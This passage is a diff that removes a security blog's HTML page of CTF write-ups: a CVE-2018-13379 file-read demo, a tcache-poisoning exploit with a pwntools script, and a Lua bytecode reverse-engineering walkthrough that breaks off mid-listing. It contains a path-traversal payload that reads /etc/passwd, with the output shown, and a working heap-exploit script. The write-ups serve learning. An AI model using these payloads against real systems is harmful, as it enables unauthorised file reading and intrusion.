@@ -1,581 +1,254 @@
 <!DOCTYPE html>
-<html>
-<head>
-
-  <meta charset="UTF-8">
-  <title>Welcome</title>
-  <meta name="viewport" content="width=device-width">
-
-  <!--[if lt IE 9]>
-    <script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
-  <![endif]-->
-
-  <link href="/assets/css/style.css" rel="stylesheet" />
-  <link href="/assets/css/colors-dark.css" rel="stylesheet" />
-
-</head>
-
-<body>
-
-
-
-  <header id="header">
-    <h1><a href="/"><i class="icon-sun"></i> Tripoloski</a></h1>
-    <p>just a student whose love to break things mostly binary , i do programming in web as a backend developer, i'm a bug hunter too.feel free to contact me if you think i can help your company arsalan.dp@gmail.com</p>
-  </header>
-
-
-
-  <div id="page">
-
-
-
-    <div id="sidebar">
-      <nav>
-        <ul>
-          <li><a href="/">Home</a></li>
-          <li><a href="/archives">Archive</a></li>
-          <li><a href="/about">About</a></li>
-          <li><a href="https://twitter.com/tripoloski_1337">Twitter</a></li>
-          <li><a href="/feed.xml">RSS Feed</a></li>
-        </ul>
-      </nav>
-    </div>
-
-
-
-    <div id="content">
-      
-
-	<article class="post">
-
-		
-			<h1><a href="/2019/09/09/simple-demonstrating-CVE-2018-13379/">Simple demonstrating CVE-2018-13379</a></h1>
-		
-
-		<div class="post-content"><h1 id="story">Story</h1>
-<p>i know this bug after playing ctf on Cyber Jawara 2019. and i think it looks cool and it’s possible if someone implements the same code for development. after i got the flag i got the CVE code and my research soul really wanted to know more about this , after searching on internet i found article about it , it’s from orange whose found this bug <a href="https://blog.orange.tw/2019/08/attacking-ssl-vpn-part-2-breaking-the-fortigate-ssl-vpn.html">here</a> , he said</p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>While fetching corresponding language file, 
-it builds the json file path with the parameter lang:
-</code></pre></div></div>
-
-<p>and here’s the actuall bug</p>
-
-<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">snprintf</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="s">"/migadmin/lang/%s.json"</span><span class="p">,</span> <span class="n">lang</span><span class="p">);</span></code></pre></figure>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>There is no protection, but a file extension appended automatically. It seems like we can only 
-read json file. However, actually we can abuse the feature of snprintf. According to the man 
-page, it writes at most size-1 into the output string. Therefore, we only need to make it exceed 
-the buffer size and the .json will be stripped. Then we can read whatever we want.
-</code></pre></div></div>
-
-<p>yes , it simple , since the developer use snprintf() so we can trick the snprintf() to remove the “.json” string by exced the string , it allow attacker to do <strong><em>arbitrary file reading</em></strong> , in this to make it more clear and easy to understand i create a code in c. (btw i just modified the actual code from Cyber Jawara 2019 ctf competition LOL) , here is the code :</p>
-
-<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#include &lt;stdio.h&gt;
-#include &lt;string.h&gt;
-</span>
-<span class="cp">#define MAXN 128
-</span><span class="kt">void</span> <span class="n">main</span><span class="p">(){</span>
-  <span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">;</span>
-  <span class="kt">char</span> <span class="n">s</span><span class="p">[</span><span class="n">MAXN</span><span class="p">];</span>
-  <span class="kt">char</span> <span class="n">lang</span><span class="p">[</span><span class="n">MAXN</span><span class="p">];</span>
-  <span class="kt">char</span> <span class="n">menu</span><span class="p">[</span><span class="n">MAXN</span><span class="p">];</span>
-  <span class="kt">int</span> <span class="n">choice</span><span class="p">;</span>
-
-  <span class="n">printf</span><span class="p">(</span><span class="s">"Choose language (en/jp): "</span><span class="p">);</span>
-  <span class="n">fgets</span><span class="p">(</span><span class="n">lang</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">lang</span><span class="p">),</span> <span class="n">stdin</span><span class="p">);</span>
-  <span class="n">strtok</span><span class="p">(</span><span class="n">lang</span><span class="p">,</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
-
-  <span class="n">snprintf</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">MAXN</span><span class="p">,</span> <span class="s">"lang/%s.json"</span><span class="p">,</span> <span class="n">lang</span><span class="p">);</span>
-
-  <span class="n">fp</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">"r"</span><span class="p">);</span>
-
-  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
-    <span class="n">puts</span><span class="p">(</span><span class="s">"Error: language not found"</span><span class="p">);</span>
-    <span class="k">return</span><span class="p">;</span>
-  <span class="p">}</span>
-
-  <span class="k">while</span> <span class="p">(</span><span class="n">fgets</span><span class="p">(</span><span class="n">menu</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">menu</span><span class="p">),</span> <span class="n">fp</span><span class="p">))</span> <span class="p">{</span>
-    <span class="n">strtok</span><span class="p">(</span><span class="n">menu</span><span class="p">,</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
-    <span class="n">printf</span><span class="p">(</span><span class="s">"%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">menu</span><span class="p">);</span>
-  <span class="p">}</span>
-  <span class="n">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>
-	<span class="k">return</span><span class="p">;</span>
-<span class="p">}</span></code></pre></figure>
-
-<p>as you can see , we use the same code</p>
-
-<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">snprintf</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">MAXN</span><span class="p">,</span> <span class="s">"lang/%s.json"</span><span class="p">,</span> <span class="n">lang</span><span class="p">);</span></code></pre></figure>
-
-<p>and the MAXN const have 128 value , it’s mean we have 128 size on stack , so we have to fill the buffer to remove “.json” string so we can open file whatever we want , to do this i can use this payload :</p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>../../../../../.././././././././././././././././././././././././././././././././././././././././././././././././etc/passwd
-</code></pre></div></div>
-
-<p>to get <strong><em>/etc/passwd</em></strong> file from this bug , and here’s the output:</p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Choose language (en/jp): ../../../../../.././././././././././././././././././././././././././././././././././././././././././././././././etc/passwd
-root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-bin:x:2:2:bin:/bin:/usr/sbin/nologin
-sys:x:3:3:sys:/dev:/usr/sbin/nologin
-sync:x:4:65534:sync:/bin:/bin/sync
-games:x:5:60:games:/usr/games:/usr/sbin/nologin
-man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
-lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
-mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
-news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
-uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
-proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
-www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
-backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
-list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
-irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
-gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
-nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
-systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
-systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
-syslog:x:102:106::/home/syslog:/usr/sbin/nologin
-messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
-_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
-uuidd:x:105:111::/run/uuidd:/usr/sbin/nologin
-avahi-autoipd:x:106:112:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
-usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
-dnsmasq:x:108:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
-rtkit:x:109:114:RealtimeKit,,,:/proc:/usr/sbin/nologin
-speech-dispatcher:x:110:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
-whoopsie:x:111:117::/nonexistent:/bin/false
-kernoops:x:112:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
-saned:x:113:119::/var/lib/saned:/usr/sbin/nologin
-pulse:x:114:120:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
-avahi:x:115:122:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
-colord:x:116:123:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
-hplip:x:117:7:HPLIP system user,,,:/var/run/hplip:/bin/false
-geoclue:x:118:124::/var/lib/geoclue:/usr/sbin/nologin
-gnome-initial-setup:x:119:65534::/run/gnome-initial-setup/:/bin/false
-gdm:x:120:125:Gnome Display Manager:/var/lib/gdm3:/bin/false
-tripoloski:x:1000:1000:tripoloski,,,:/home/tripoloski:/bin/bash
-</code></pre></div></div>
-
-</div>
-
-	</article>
-
-
-
-	<article class="post">
-
-		
-			<h1><a href="/2019/09/09/tcache_poisoning/">Tcache Poisoning [heap exploitation]</a></h1>
-		
-
-		<div class="post-content"><h1 id="tcache-poisoning">Tcache Poisoning</h1>
-<p>what is tcache poisoning ? 
-In glibc-2.26, TCache (per-thread cache), a new feature, was introduced in malloc.
-and tcache poisoning is a technique to poison Tcache feature in glibc-2.26. for example from how2heap by shellpish team</p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>This file demonstrates a simple tcache poisoning attack by tricking malloc into
-returning a pointer to an arbitrary location (in this case, the stack).
-The attack is very similar to fastbin corruption attack.
-
-The address we want malloc() to return is 0x7ffedaf11040.
-Allocating 1 buffer.
-malloc(128): 0x55a2b964b260
-Freeing the buffer...
-Now the tcache list has [ 0x55a2b964b260 ].
-We overwrite the first 8 bytes (fd/next pointer) of the data at 0x55a2b964b260
-to point to the location to control (0x7ffedaf11040).
-1st malloc(128): 0x55a2b964b260
-Now the tcache list has [ 0x7ffedaf11040 ].
-2nd malloc(128): 0x7ffedaf11040
-We got the control
-</code></pre></div></div>
-
-<p>for another example we will try to exploit this simple program, by using tcache poisoning:</p>
-
-<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#include &lt;stdio.h&gt;
-#include &lt;stdint.h&gt;
-#include &lt;stdlib.h&gt;
-</span>
-<span class="cp">#define SZ_BLOCK 200
-#define SZ_HEAP  10
-#define SZ_FLAG 100
-</span>
-<span class="kt">char</span> <span class="n">a</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
-<span class="n">u_int</span> <span class="o">*</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
-
-<span class="kt">void</span> <span class="n">win</span><span class="p">(){</span>
-	<span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="n">SZ_FLAG</span><span class="p">];</span>
-	<span class="kt">FILE</span> <span class="o">*</span><span class="n">f</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">"flag.txt"</span><span class="p">,</span><span class="s">"r"</span><span class="p">);</span>
-	<span class="k">if</span> <span class="p">(</span><span class="n">f</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">){</span>
-		<span class="n">puts</span><span class="p">(</span><span class="s">"[!] error code 901"</span><span class="p">);</span>
-		<span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
-	<span class="p">}</span>
-	<span class="n">fgets</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="n">SZ_FLAG</span><span class="p">,</span><span class="n">f</span><span class="p">);</span>
-	<span class="n">puts</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
-<span class="p">}</span>
-
-<span class="kt">void</span> <span class="n">welcome</span><span class="p">(){</span>
-<span class="n">puts</span><span class="p">(</span><span class="s">"     __                      __                           _                      _              "</span><span class="p">);</span>
-<span class="n">puts</span><span class="p">(</span><span class="s">"    / /_ _____ ____ _ _____ / /_   ___     ____   ____   (_)_____ ____   ____   (_)____   ____ _"</span><span class="p">);</span>
-<span class="n">puts</span><span class="p">(</span><span class="s">"   / __// ___// __ `// ___// __ </span><span class="se">\\</span><span class="s"> / _ </span><span class="se">\\</span><span class="s">   / __ </span><span class="se">\\</span><span class="s"> / __ </span><span class="se">\\</span><span class="s"> / // ___// __ </span><span class="se">\\</span><span class="s"> / __ </span><span class="se">\\</span><span class="s"> / // __ </span><span class="se">\\</span><span class="s"> / __ `/"</span><span class="p">);</span>
-<span class="n">puts</span><span class="p">(</span><span class="s">"  / /_ / /__ / /_/ // /__ / / / //  __/  / /_/ // /_/ // /(__  )/ /_/ // / / // // / / // /_/ / "</span><span class="p">);</span>
-<span class="n">puts</span><span class="p">(</span><span class="s">"  </span><span class="se">\\</span><span class="s">__/ </span><span class="se">\\</span><span class="s">___/ </span><span class="se">\\</span><span class="s">__,_/ </span><span class="se">\\</span><span class="s">___//_/ /_/ </span><span class="se">\\</span><span class="s">___/  / .___/ </span><span class="se">\\</span><span class="s">____//_//____/ </span><span class="se">\\</span><span class="s">____//_/ /_//_//_/ /_/ </span><span class="se">\\</span><span class="s">__, /  "</span><span class="p">);</span>
-<span class="n">puts</span><span class="p">(</span><span class="s">"       HackerClass Gunadarma @2019     /_/        author: arsalan (tripoloski)         /____/   "</span><span class="p">);</span>
-<span class="p">}</span>
-
-<span class="kt">void</span> <span class="n">menu</span><span class="p">(){</span>
-	<span class="n">puts</span><span class="p">(</span><span class="s">"+---------------------+"</span><span class="p">);</span>
-	<span class="n">puts</span><span class="p">(</span><span class="s">"|         Menu        |"</span><span class="p">);</span>
-	<span class="n">puts</span><span class="p">(</span><span class="s">"+---------------------+"</span><span class="p">);</span>
-	<span class="n">puts</span><span class="p">(</span><span class="s">"| 1. allocate memory  |"</span><span class="p">);</span>
-	<span class="n">puts</span><span class="p">(</span><span class="s">"| 2. freeing memory   |"</span><span class="p">);</span>
-	<span class="n">puts</span><span class="p">(</span><span class="s">"| 3. exit             |"</span><span class="p">);</span>
-	<span class="n">puts</span><span class="p">(</span><span class="s">"+---------------------+"</span><span class="p">);</span>
-	<span class="n">printf</span><span class="p">(</span><span class="s">"| select [1-3] : "</span><span class="p">);</span>
-<span class="p">}</span>
-
-<span class="kt">void</span> <span class="n">init</span><span class="p">(){</span>
-	<span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0</span> <span class="p">,</span> <span class="mi">2</span> <span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
-	<span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0</span> <span class="p">,</span> <span class="mi">2</span> <span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
-<span class="p">}</span>
-
-<span class="kt">void</span> <span class="n">create_memory</span><span class="p">(){</span>
-	<span class="kt">int</span> <span class="n">size</span><span class="p">;</span>
-	<span class="n">printf</span><span class="p">(</span><span class="s">"[?] size : "</span><span class="p">);</span>
-	<span class="c1">//read(0,size , sizeof(size));
-</span>	<span class="n">scanf</span><span class="p">(</span><span class="s">"%d"</span> <span class="p">,</span> <span class="o">&amp;</span><span class="n">size</span><span class="p">);</span>
-	<span class="n">printf</span><span class="p">(</span><span class="s">"[?] data : "</span><span class="p">);</span>
-	<span class="k">if</span> <span class="p">(</span><span class="n">size</span> <span class="o">&lt;=</span> <span class="mh">0x88</span><span class="p">){</span>
-		<span class="n">buf</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>
-		<span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">buf</span> <span class="p">,</span> <span class="n">size</span><span class="p">);</span>
-	<span class="p">}</span>
-	<span class="n">puts</span><span class="p">(</span><span class="s">"[+] memory allocated!"</span><span class="p">);</span>
-<span class="p">}</span>
-
-<span class="kt">void</span> <span class="n">release_memory</span><span class="p">(){</span>
-	<span class="n">free</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
-<span class="p">}</span>
-
-<span class="kt">void</span> <span class="n">main</span><span class="p">(){</span>
-	<span class="n">init</span><span class="p">();</span>
-	<span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
-	<span class="n">welcome</span><span class="p">();</span>
-	<span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">){</span>
-		<span class="n">menu</span><span class="p">();</span>
-		<span class="n">read</span><span class="p">(</span><span class="mi">0</span> <span class="p">,</span> <span class="n">buf</span> <span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>
-		<span class="k">switch</span><span class="p">(</span><span class="n">atoi</span><span class="p">(</span><span class="n">buf</span><span class="p">)){</span>
-			<span class="k">case</span> <span class="mi">1</span><span class="p">:</span>
-				<span class="n">create_memory</span><span class="p">();</span>
-				<span class="k">break</span><span class="p">;</span>
-			<span class="k">case</span> <span class="mi">2</span><span class="p">:</span>
-				<span class="n">release_memory</span><span class="p">();</span>
-				<span class="k">break</span><span class="p">;</span>
-			<span class="k">case</span> <span class="mi">3</span><span class="p">:</span>
-				<span class="n">puts</span><span class="p">(</span><span class="s">"[+] exiting..."</span><span class="p">);</span>
-				<span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
-				<span class="k">break</span><span class="p">;</span>
-			<span class="k">default</span><span class="o">:</span>
-				<span class="n">puts</span><span class="p">(</span><span class="s">"[!] invalid choice error code 1902"</span><span class="p">);</span>
-				<span class="k">break</span><span class="p">;</span>
-		<span class="p">}</span>
-	<span class="p">}</span>
-<span class="p">}</span></code></pre></figure>
-
-<p>you can find this challenge on my repository <a href="https://github.com/tripoloski1337/learn-to-pwn/tree/master/tcache_poisoning">here</a> in this case we have to allocating memory and double freeing , since there’s no checks for double free on glibc-2.26+. so we can directly do double free, after that we can allocate memory and fill it with whatever we want. at this point we already controll the rdx register.</p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>malloc(0x100)
-free(0)
-free(0)
-malloc(0x100) &lt;------ control rdi
-malloc(0x100) &lt;------ just a padding
-malloc(0x100) &lt;------ another control 
-</code></pre></div></div>
-
-<h3 id="how-can-it-be-">how can it be ?</h3>
-<p>if you look into gdb there’s something interesting at address <strong>&lt;malloc+407&gt;</strong></p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code> → 0x7ffff7a7b207 &lt;malloc+407&gt;     mov    rdi, QWORD PTR [rdx]
-</code></pre></div></div>
-
-<p>this instruction will mov rdx value to rdi. it’s mean it will move whatever value is from rdx to rdi register. and suddenly our rdx is filled with our input before</p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$rax   : 0x5
-$rbx   : 0x64
-$rcx   : 0x0000000000602010  →  0x0000000000000000
-$rdx   : 0x4141414141414141 ("AAAAAAAA"?) &lt;----- our input data from the seccond malloc
-$rsp   : 0x00007fffffffe320  →  0x0000000000400dd1  →  "+---------------------+"
-$rbp   : 0xffffffffffffffb0
-$rsi   : 0x0000000000602038  →  0x0000000000000000
-$rdi   : 0x64
-$rip   : 0x00007ffff7a7b207  →  &lt;malloc+407&gt; mov rdi, QWORD PTR [rdx]
-$r8    : 0xb
-$r9    : 0x0
-$r10   : 0x00007ffff7b82cc0  →  0x0002000200020002
-$r11   : 0x246
-$r12   : 0x0000000000400740  →  &lt;_start+0&gt; xor ebp, ebp
-$r13   : 0x00007fffffffe460  →  0x0000000000000001
-$r14   : 0x0
-$r15   : 0x0
-</code></pre></div></div>
-
-<p>in this case we can GOT overwrite from exit() function to win() function</p>
-
-<figure class="highlight"><pre><code class="language-c" data-lang="c">	<span class="k">case</span> <span class="mi">3</span><span class="p">:</span>
-		<span class="n">puts</span><span class="p">(</span><span class="s">"[+] exiting..."</span><span class="p">);</span>
-		<span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> <span class="o">&lt;--</span> <span class="n">our</span> <span class="n">goal</span> <span class="n">to</span> <span class="n">change</span> <span class="n">it</span> <span class="n">to</span> <span class="n">win</span><span class="p">()</span>
-		<span class="k">break</span><span class="p">;</span></code></pre></figure>
-
-<p>to make it more clear and reliable i made a python script to exploit this binary</p>
-
-<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
-<span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./tcache_poisoning"</span><span class="p">)</span>
-
-<span class="k">def</span> <span class="nf">alloc</span><span class="p">(</span><span class="n">size</span><span class="p">,</span><span class="n">data</span> <span class="p">):</span>
-	<span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"| select [1-3] :"</span><span class="p">,</span><span class="s">"1"</span><span class="p">)</span>
-	<span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"[?] size :"</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
-	<span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"[?] data :"</span><span class="p">,</span><span class="n">data</span><span class="p">)</span>
-	<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"allocating"</span><span class="p">)</span>
-
-<span class="k">def</span> <span class="nf">free</span><span class="p">():</span>
-	<span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"| select [1-3] :"</span><span class="p">,</span><span class="s">"2"</span><span class="p">)</span>
-	<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"freeing"</span><span class="p">)</span>
-
-<span class="n">win_plt</span> <span class="o">=</span> <span class="mh">0x0000000000400827</span>
-<span class="n">exit_got</span> <span class="o">=</span> <span class="mh">0x000000601348</span>
-<span class="c">#gdb.attach(r)</span>
-<span class="n">alloc</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span><span class="s">"A"</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
-
-<span class="n">free</span><span class="p">()</span>
-<span class="n">free</span><span class="p">()</span>
-
-<span class="n">alloc</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">exit_got</span><span class="p">))</span>
-<span class="n">alloc</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span><span class="n">p8</span><span class="p">(</span><span class="mh">0x00</span><span class="p">))</span>
-<span class="n">alloc</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">win_plt</span><span class="p">))</span> 
-
-<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></code></pre></figure>
-
-<p>after running this python script we can select option 3 to trigger exit(). and exit() is not the real exit() function anymore it was win() function, because we GOT overwrite it</p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[+] Starting local process './tcache_poisoning': pid 28800
-[*] allocating
-[*] allocating
-[*] freeing
-[*] freeing
-[*] allocating
-[*] allocating
-[*] allocating
-[*] Switching to interactive mode
- [+] memory allocated!
-+---------------------+
-|         Menu        |
-+---------------------+
-| 1. allocate memory  |
-| 2. freeing memory   |
-| 3. exit             |
-+---------------------+
-| select [1-3] : $ 3
-[+] exiting...
-ctf{y0u_must_b3_a_pwnerrrr!!!!!}
-</code></pre></div></div>
-
-<p>as you can see there’s string <strong><em>ctf{y0u_must_b3_a_pwnerrrr!!!!!}</em></strong>. it mean our win() function has been called and give us data from file flag.txt, you can see what win() actually do here</p>
-
-<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="n">win</span><span class="p">(){</span>
-	<span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="n">SZ_FLAG</span><span class="p">];</span>
-	<span class="kt">FILE</span> <span class="o">*</span><span class="n">f</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">"flag.txt"</span><span class="p">,</span><span class="s">"r"</span><span class="p">);</span>
-	<span class="k">if</span> <span class="p">(</span><span class="n">f</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">){</span>
-		<span class="n">puts</span><span class="p">(</span><span class="s">"[!] error code 901"</span><span class="p">);</span>
-		<span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
-	<span class="p">}</span>
-	<span class="n">fgets</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="n">SZ_FLAG</span><span class="p">,</span><span class="n">f</span><span class="p">);</span>
-	<span class="n">puts</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
-<span class="p">}</span></code></pre></figure>
-</div>
-
-	</article>
-
-
-
-	<article class="post">
-
-		
-			<h1><a href="/2019/09/09/reverse-engineering-lua-code/">Reverse engineering lua code inside an elf binary</a></h1>
-		
-
-		<div class="post-content"><h1 id="writeup-gemastik12-ctf-decode-me">writeup Gemastik12 CTF [decode-me]</h1>
-
-<p>this is a ctf competition challenge. in this blog post, i will explain how i solve this challenge. actually, i got this challenge when competing in gemastik 12 ctf telkom, in this challenge we was given a binary called mooncode you can download the ELF binary <a href="https://google.com">here</a></p>
-
-<h1 id="digging-into-it">digging into it</h1>
-
-<p>this is the information of this binary</p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mooncode: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), 
-dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, 
-BuildID[sha1]=c0e15ca22b562c60f5d4535eea61d26157ecdde7, 
-not stripped
-</code></pre></div></div>
-
-<p>it’s a 64bit elf binary and ‘not stripped’ binary. that can make our work easier.
-let’s open it on Ghidra, if you are not familiar with Ghidra you can check theier repository <a href="https://github.com/NationalSecurityAgency/ghidra">here</a></p>
-
-<h1 id="ghidra-section">Ghidra section</h1>
-
-<p>let’s focus on main function , here’s the decompiled main function from Ghidra</p>
-
-<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">param_1</span><span class="p">)</span>
-
-<span class="p">{</span>
-  <span class="kt">uint8_t</span> <span class="n">local_AL_15</span><span class="p">;</span>
-  <span class="kt">uint8_t</span> <span class="n">local_SIL</span><span class="p">;</span>
-  <span class="kt">char</span> <span class="o">*</span><span class="n">local_28</span><span class="p">;</span>
-
-  <span class="n">_local_AL_15</span> <span class="o">=</span> <span class="n">luaL_newstate</span><span class="p">();</span>
-  <span class="n">luaL_openlibs</span><span class="p">(</span><span class="n">_local_AL_15</span><span class="p">);</span>
-  <span class="n">local_28</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">code</span><span class="p">;</span> <span class="c1">// &lt;--- this is the lua bytecode was stored 
-</span>  <span class="n">lua_load</span><span class="p">(</span><span class="n">_local_AL_15</span><span class="p">,</span><span class="n">readMemFile</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_28</span><span class="p">,</span><span class="o">&amp;</span><span class="n">DAT_00102004</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
-  <span class="n">lua_pcallk</span><span class="p">(</span><span class="n">_local_AL_15</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
-  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-<span class="p">}</span></code></pre></figure>
-
-<p>as you can see there’s the lua_load(). since the binary linked with liblua5.3.so.0, so i assume this binary will run the lua bytecode from a memory. in this case the bytecode stored in a global variable called ‘code’.</p>
-
-<p>here’s the value of code variable</p>
-
-<p><img src="/images/2019-10-03-170254_320x418_scrot.png" class="center" /></p>
-
-<p>as you can see there’s “Luas” string inside this memory , so we can just dump or export this code variable using Ghidra. and here’s the lua bytecode we successfully dump</p>
-
-<p><img src="/images/2019-10-03-171529_545x57_scrot.png" class="center" /></p>
-
-<p>since this is a Lua bytecode file, so we can get the original source code by decompile it using <a href="https://sourceforge.net/projects/unluac/">unluac</a> , and here’s the source code</p>
-
-<figure class="highlight"><pre><code class="language-lua" data-lang="lua"><span class="nb">io.write</span><span class="p">(</span><span class="s2">"Flag: "</span><span class="p">)</span>
-<span class="n">user_input</span> <span class="o">=</span> <span class="nb">io.read</span><span class="p">()</span>
-<span class="n">key</span> <span class="o">=</span> <span class="p">{</span>
-  <span class="mi">159</span><span class="p">,</span>
-  <span class="mi">82</span><span class="p">,</span>
-  <span class="mi">149</span><span class="p">,</span>
-  <span class="mi">103</span><span class="p">,</span>
-  <span class="mi">179</span><span class="p">,</span>
-  <span class="mi">62</span><span class="p">,</span>
-  <span class="mi">111</span><span class="p">,</span>
-  <span class="mi">84</span><span class="p">,</span>
-  <span class="mi">236</span><span class="p">,</span>
-  <span class="mi">251</span><span class="p">,</span>
-  <span class="mi">222</span><span class="p">,</span>
-  <span class="mi">213</span><span class="p">,</span>
-  <span class="mi">195</span><span class="p">,</span>
-  <span class="mi">125</span><span class="p">,</span>
-  <span class="mi">163</span><span class="p">,</span>
-  <span class="mi">144</span><span class="p">,</span>
-  <span class="mi">118</span><span class="p">,</span>
-  <span class="mi">199</span><span class="p">,</span>
